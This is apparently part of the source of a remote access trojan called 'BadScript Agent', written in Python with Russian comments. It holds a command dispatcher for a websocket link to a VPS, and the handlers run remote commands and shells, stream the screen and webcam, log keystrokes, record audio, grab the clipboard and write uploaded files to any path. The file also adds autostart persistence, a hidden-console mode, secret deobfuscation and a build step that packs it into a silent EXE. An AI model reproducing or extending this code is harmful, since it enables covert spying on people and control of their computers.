# ===================================================================
# Command dispatcher for active session
# ===================================================================
async def handle_session(ws, fernet, vps_url, uid, secret):
    camera = None
    screen_stream = None
    shell_session = None
    file_tracker = FileTransferTracker()

    try:
        async for raw in ws:
            try:
                msg = decrypt_msg(fernet, raw)
            except Exception as e:
                log.debug("Decrypt failed: %s", e)
                continue

            t = msg.get("type")
            p = msg.get("payload", {})

            if t == "ping":
                await _safe_send(ws, fernet, {"type": "pong", "payload": {}})

            elif t == "heartbeat":
                await _safe_send(ws, fernet, {
                    "type": "heartbeat",
                    "payload": {
                        "time": time.time(),
                        "cpu": psutil.cpu_percent(interval=0.1) if HAS_PSUTIL else 0,
                        "ram": psutil.virtual_memory().percent if HAS_PSUTIL else 0,
                    },
                })

            elif t == "screenshot":
                q = p.get("quality", 80)
                res, err = capture_screenshot(quality=q)
                if res:
                    await _safe_send(ws, fernet, {"type": "screenshot_data", "payload": res})
                else:
                    await _safe_send(ws, fernet, {"type": "screenshot_data", "payload": {"error": err}})

            elif t == "exec":
                cmd = p.get("command", "")
                tout = p.get("timeout", 60)
                res = await run_command(cmd, timeout=tout)
                await _safe_send(ws, fernet, {"type": "exec_result", "payload": res})

            elif t == "shell_open":
                if shell_session:
                    await shell_session.close()
                shell_session = ShellSession(ws, fernet)
                await shell_session.open()

            elif t == "shell_input":
                if shell_session:
                    await shell_session.write(p.get("data", ""), is_raw=p.get("raw", False))

            elif t == "shell_close":
                if shell_session:
                    await shell_session.close()
                    shell_session = None

            elif t == "screen_start":
                if screen_stream:
                    await screen_stream.stop()
                screen_stream = ScreenStream(ws, fernet, fps=p.get("fps", 5), quality=p.get("quality", 70))
                await screen_stream.start()

            elif t == "screen_stop":
                if screen_stream:
                    await screen_stream.stop()
                    screen_stream = None

            elif t == "stream_start":
                if camera:
                    await camera.stop()
                camera = CameraStream(ws, fernet, camera_index=p.get("index", 0), fps=p.get("fps", 10), quality=p.get("quality", 60))
                await camera.start()

            elif t == "stream_stop":
                if camera:
                    await camera.stop()
                    camera = None

            elif t == "process_list":
                res = get_process_list()
                await _safe_send(ws, fernet, {"type": "process_list", "payload": res})

            elif t == "process_kill":
                res = kill_process(pid=p.get("pid"), name=p.get("name"))
                await _safe_send(ws, fernet, {"type": "process_kill_result", "payload": res})

            elif t == "sysinfo":
                res = get_sysinfo()
                await _safe_send(ws, fernet, {"type": "sysinfo", "payload": res})

            elif t == "fs_list":
                res = fs_list(p.get("path", "."))
                await _safe_send(ws, fernet, {"type": "fs_list", "payload": res})

            elif t == "clipboard_get":
                res = get_clipboard()
                await _safe_send(ws, fernet, {"type": "clipboard_result", "payload": res})

            elif t == "clipboard_set":
                res = set_clipboard(p.get("text", ""))
                await _safe_send(ws, fernet, {"type": "clipboard_result", "payload": res})

            elif t == "keylog_start":
                keylogger.start()
                await _safe_send(ws, fernet, {"type": "keylog_status", "payload": {"status": "started"}})

            elif t == "keylog_stop":
                keylogger.stop()
                await _safe_send(ws, fernet, {"type": "keylog_status", "payload": {"status": "stopped"}})

            elif t == "keylog_get":
                txt = keylogger.get_log()
                await _safe_send(ws, fernet, {"type": "keylog_data", "payload": {"data": txt, "length": len(txt)}})

            elif t == "audio_start":
                ok, msg_txt = recorder.start(duration=p.get("duration", 30))
                await _safe_send(ws, fernet, {"type": "audio_status", "payload": {"status": "started" if ok else "failed", "message": msg_txt}})

            elif t == "audio_stop":
                ok, msg_txt = recorder.stop()
                await _safe_send(ws, fernet, {"type": "audio_status", "payload": {"status": "stopped" if ok else "failed", "message": msg_txt}})

            elif t == "audio_list":
                recs = recorder.list_recordings()
                await _safe_send(ws, fernet, {"type": "audio_list", "payload": {"recordings": recs}})

            elif t == "log_view":
                if os.path.isfile(LOG_FILE_PATH):
                    with open(LOG_FILE_PATH, "r", encoding="utf-8", errors="replace") as f:
                        lines = "".join(f.readlines()[-200:])
                    await _safe_send(ws, fernet, {"type": "log_view_result", "payload": {"lines": lines, "exists": True}})
                else:
                    await _safe_send(ws, fernet, {"type": "log_view_result", "payload": {"lines": "Лог-файл отсутствует", "exists": False}})

            elif t == "log_delete":
                if os.path.isfile(LOG_FILE_PATH):
                    os.remove(LOG_FILE_PATH)
                await _safe_send(ws, fernet, {"type": "log_delete_result", "payload": {"message": "Лог очищен"}})

            elif t == "update":
                await do_update(ws, fernet)

            elif t == "server_restart":
                await _safe_send(ws, fernet, {"type": "server_restart_ack", "payload": {"status": "restarting"}})
                _restart_self()

            elif t == "install_autostart":
                ok, msg_txt = install_autostart(vps_url, uid, secret)
                await _safe_send(ws, fernet, {"type": "autostart_result", "payload": {"success": ok, "message": msg_txt}})

            elif t == "remove_autostart":
                ok, msg_txt = remove_autostart()
                await _safe_send(ws, fernet, {"type": "autostart_result", "payload": {"success": ok, "message": msg_txt}})

            # --- Приём файла от панели (чанками или целиком) ---
            elif t == "file_upload_start":
                # Начало загрузки: payload содержит file_id, filename, dest_path, total_chunks, total_size
                fid = p.get("file_id", "")
                filename = p.get("filename", "uploaded_file")
                dest = p.get("dest_path", "").strip()
                total_chunks = p.get("total_chunks", 1)
                total_size = p.get("total_size", 0)
                # Определяем путь сохранения
                if dest:
                    save_path = os.path.abspath(dest)
                    if os.path.isdir(save_path):
                        save_path = os.path.join(save_path, filename)
                else:
                    save_path = os.path.join(AGENT_DIR, filename)
                # Создаём директорию если нет
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                # Инициализируем буфер
                file_tracker.send_buffers[fid] = {
                    "path": save_path,
                    "total": total_chunks,
                    "received": 0,
                    "chunks": [None] * total_chunks,
                    "size": total_size,
                }
                await _safe_send(ws, fernet, {
                    "type": "file_upload_status",
                    "payload": {"file_id": fid, "status": "ready", "message": f"Готов к приёму: {filename}"},
                })

            elif t == "file_upload_chunk":
                fid = p.get("file_id", "")
                idx = p.get("index", 0)
                data_b64 = p.get("data", "")
                buf = file_tracker.send_buffers.get(fid)
                if not buf:
                    await _safe_send(ws, fernet, {
                        "type": "file_upload_status",
                        "payload": {"file_id": fid, "status": "error", "message": "Неизвестный file_id"},
                    })
                    continue
                buf["chunks"][idx] = data_b64
                buf["received"] += 1
                # Отправляем прогресс
                pct = int(buf["received"] / buf["total"] * 100)
                await _safe_send(ws, fernet, {
                    "type": "file_upload_progress",
                    "payload": {"file_id": fid, "received": buf["received"], "total": buf["total"], "percent": pct},
                })
                # Если все чанки получены — собираем файл
                if buf["received"] >= buf["total"]:
                    try:
                        full_b64 = "".join(buf["chunks"])
                        file_bytes = base64.b64decode(full_b64)
                        with open(buf["path"], "wb") as f:
                            f.write(file_bytes)
                        final_size = os.path.getsize(buf["path"])
                        del file_tracker.send_buffers[fid]
                        await _safe_send(ws, fernet, {
                            "type": "file_upload_status",
                            "payload": {
                                "file_id": fid,
                                "status": "done",
                                "message": f"Файл сохранён: {buf['path']}",
                                "path": buf["path"],
                                "size": final_size,
                            },
                        })
                        log.info("Файл получен: %s (%d байт)", buf["path"], final_size)
                    except Exception as e:
                        del file_tracker.send_buffers[fid]
                        await _safe_send(ws, fernet, {
                            "type": "file_upload_status",
                            "payload": {"file_id": fid, "status": "error", "message": str(e)},
                        })

            elif t == "file_upload_single":
                # Маленький файл целиком в одном сообщении
                filename = p.get("filename", "uploaded_file")
                dest = p.get("dest_path", "").strip()
                data_b64 = p.get("data", "")
                if dest:
                    save_path = os.path.abspath(dest)
                    if os.path.isdir(save_path):
                        save_path = os.path.join(save_path, filename)
                else:
                    save_path = os.path.join(AGENT_DIR, filename)
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                try:
                    file_bytes = base64.b64decode(data_b64)
                    with open(save_path, "wb") as f:
                        f.write(file_bytes)
                    final_size = os.path.getsize(save_path)
                    await _safe_send(ws, fernet, {
                        "type": "file_upload_status",
                        "payload": {
                            "status": "done",
                            "message": f"Файл сохранён: {save_path}",
                            "path": save_path,
                            "size": final_size,
                        },
                    })
                    log.info("Файл получен (single): %s (%d байт)", save_path, final_size)
                except Exception as e:
                    await _safe_send(ws, fernet, {
                        "type": "file_upload_status",
                        "payload": {"status": "error", "message": str(e)},
                    })

    finally:
        if camera:
            await camera.stop()
        if screen_stream:
            await screen_stream.stop()
        if shell_session:
            await shell_session.close()
        keylogger.stop()


# ===================================================================
# Main Agent Loop
# ===================================================================
async def run_agent(vps_url, uid, secret):
    while True:
        try:
            log.info("Подключение к VPS: %s ...", vps_url)
            async with websockets.connect(
                vps_url,
                ping_interval=30,
                ping_timeout=10,
                max_size=20 * 1024 * 1024,
            ) as ws:
                # 1. Отправляем auth (plain JSON text)
                auth_payload = {
                    "type": "auth",
                    "uid": uid,
                    "token": secret,
                    "hostname": platform.node(),
                    "os_info": f"{platform.system()} {platform.release()} ({platform.machine()})",
                }
                await ws.send(json.dumps(auth_payload))

                # 2. Ждём auth_ok
                resp_raw = await asyncio.wait_for(ws.recv(), timeout=15)
                if isinstance(resp_raw, bytes):
                    resp_data = json.loads(resp_raw.decode('utf-8', errors='replace'))
                else:
                    resp_data = json.loads(resp_raw)

                if resp_data.get("type") != "auth_ok":
                    log.error("Аутентификация отклонена VPS: %s", resp_data)
                    await asyncio.sleep(10)
                    continue

                log.info("Успешная аутентификация на VPS! Ожидание команд...")
                fernet = make_fernet(secret)

                # 3. Слушаем и обрабатываем команды
                await handle_session(ws, fernet, vps_url, uid, secret)

        except (websockets.exceptions.ConnectionClosed, ConnectionRefusedError, OSError) as e:
            log.warning("Соединение с VPS разорвано: %s. Переподключение через 5 сек...", e)
        except asyncio.CancelledError:
            log.info("Агент остановлен.")
            break
        except Exception as e:
            log.exception("Ошибка агента: %s. Переподключение через 5 сек...", e)

        await asyncio.sleep(5)


def hide_console():
    if IS_WINDOWS and sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass


def build_exe():
    if not shutil.which("pyinstaller"):
        log.error("PyInstaller не найден. Установите: pip install pyinstaller")
        sys.exit(1)
    script = Path(__file__).resolve()
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--name", "agent",
        "--hidden-import=mss", "--hidden-import=cv2",
        "--hidden-import=PIL", "--hidden-import=cryptography",
        "--hidden-import=websockets", "--hidden-import=keyboard",
        "--hidden-import=pynput", "--hidden-import=sounddevice",
        "--hidden-import=numpy", "--hidden-import=psutil",
        "--hidden-import=pyautogui",
        "--noupx",
        str(script),
    ]
    log.info("Сборка EXE: %s", " ".join(cmd))
    r = subprocess.run(cmd, cwd=script.parent)
    if r.returncode == 0:
        log.info("EXE успешно собран в: %s", script.parent / "dist" / "agent.exe")
    else:
        log.error("Ошибка сборки EXE")


def main():
    parser = argparse.ArgumentParser(description="BadScript Agent")
    parser.add_argument("--vps", default="ws://127.0.0.1:8000/ws/agent/", help="VPS WebSocket URL")
    parser.add_argument("--uid", required=False, help="Device UID from dashboard")
    parser.add_argument("--secret", required=False, help="Device secret token")
    parser.add_argument("--hidden", action="store_true", help="Hide console on Windows")
    parser.add_argument("--install", action="store_true", help="Install autostart")
    parser.add_argument("--uninstall", action="store_true", help="Remove autostart")
    parser.add_argument("--build-exe", action="store_true", help="Build single EXE file")
    parser.add_argument("--watchdog", action="store_true", help="Enable crash watchdog")
    args = parser.parse_args()

    if args.build_exe:
        build_exe()
        return

    secret = args.secret or ""
    if secret.startswith("OBF:"):
        secret = _deobfuscate(secret)

    uid = args.uid or ""

    if args.install:
        if not uid or not secret:
            log.error("Для установки автозапуска требуются --uid и --secret")
            return
        ok, msg = install_autostart(args.vps, uid, secret)
        print(msg)
        return

    if args.uninstall:
        ok, msg = remove_autostart()
        print(msg)
        return

    if not uid or not secret:
        log.error("Ошибка: укажите --uid и --secret для запуска агента!")
        parser.print_help()
        sys.exit(1)

    if args.hidden:
        hide_console()

    apply_pending_updates()
    setup_file_logging()
    log.info("Запуск агента BadScript (UID: %s)", uid)

    try:
        asyncio.run(run_agent(args.vps, uid, secret))
    except KeyboardInterrupt:
        log.info("Агент остановлен пользователем.")


if __name__ == "__main__":
    main()
